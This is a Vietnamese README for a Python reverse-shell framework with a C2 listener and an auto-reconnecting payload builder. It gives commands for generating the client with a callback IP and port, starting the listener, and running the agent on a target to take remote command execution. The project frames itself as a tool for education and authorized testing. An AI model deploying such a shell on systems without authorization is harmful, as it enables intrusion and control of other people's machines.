# PyShell-Framework 🚀

Một framework mini được viết bằng Python hỗ trợ xây dựng và quản lý kết nối Reverse Shell từ xa qua giao thức TCP Socket. Dự án bao gồm một máy chủ lắng nghe lệnh (C2 Server) và một công cụ tự động tạo payload (Payload Builder) hỗ trợ tính năng tự động kết nối lại khi mất mạng (Auto-reconnect).

> ⚠️ **Disclaimer / Tuyên bố miễn trừ trách nhiệm:**
> Dự án này được phát triển chỉ nhằm mục đích **nghiên cứu học thuật, giáo dục** và phục vụ cho công tác **kiểm thử xâm nhập hợp pháp (Authorized Penetration Testing)**. Tác giả hoàn toàn không chịu trách nhiệm về bất kỳ hành vi sử dụng sai mục đích hoặc gây thiệt hại nào do công cụ này gây ra. Việc sử dụng mã nguồn này trên các hệ thống không được cấp phép là vi phạm pháp luật.

---

## ✨ Tính năng nổi bật
* **Payload Builder:** Tự động tạo file payload Python tùy biến cấu hình IP và Port chỉ với một dòng lệnh.
* **Auto-Reconnect:** Client (Target) có cơ chế bắt lỗi và tự động thử kết nối lại sau mỗi 5 giây nếu server bị ngắt quãng.
* **Real-time Directory Tracking:** Cập nhật vị trí thư mục hiện hành (`cwd`) của nạn nhân theo thời gian thực trên giao diện terminal của Server.
* **Chuyển đổi thư mục (`cd`):** Hỗ trợ lệnh điều hướng thư mục trên máy mục tiêu một cách mượt mà.

---

## 🏗️ Kiến trúc hệ thống
Dự án được chia làm 2 thành phần chính:
1.  `server.py`: Đóng vai trò là Listener (C2 Server), mở cổng TCP để chờ kết nối đảo ngược từ client và tương tác qua dòng lệnh.
2.  `builder.py`: Nhận tham số cấu hình từ người dùng để sinh ra mã nguồn client độc lập chứa thông tin IP/Port định sẵn.

---

## 🚀 Hướng dẫn sử dụng

### 1. Tạo File Payload (Client)
Sử dụng công cụ `builder.py` để tạo ra script client. Bạn cần truyền vào IP và Port của máy Server (Listener).

```bash
python builder.py -i <IP_SERVER> -p <PORT_SERVER> -o agent.py

```

*Ví dụ:* `python builder.py -i 192.168.1.50 -p 8888 -o agent.py`

### 2. Khởi chạy Server Lắng nghe

Trên máy kiểm thử (Attacker), chạy file `server.py` để mở cổng chờ kết nối:

```bash
python server.py

```

### 3. Kích hoạt trên Máy mục tiêu

Sau khi đưa file `agent.py` (được sinh ra từ bước 1) lên môi trường kiểm thử mục tiêu, kích hoạt bằng lệnh:

```bash
python agent.py

```

Khi kết nối thành công, giao diện terminal trên Server sẽ hiển thị đường dẫn thư mục hiện tại của máy mục tiêu và sẵn sàng nhận lệnh thực thi. Để thoát, gõ `exit` hoặc `quit`.

---

## 🛠️ Công nghệ sử dụng

* **Ngôn ngữ:** Python 3.x
* **Thư viện gốc (Built-in):** `socket`, `subprocess`, `argparse`, `os`, `time` (Không cần cài thêm thư viện ngoài).

```
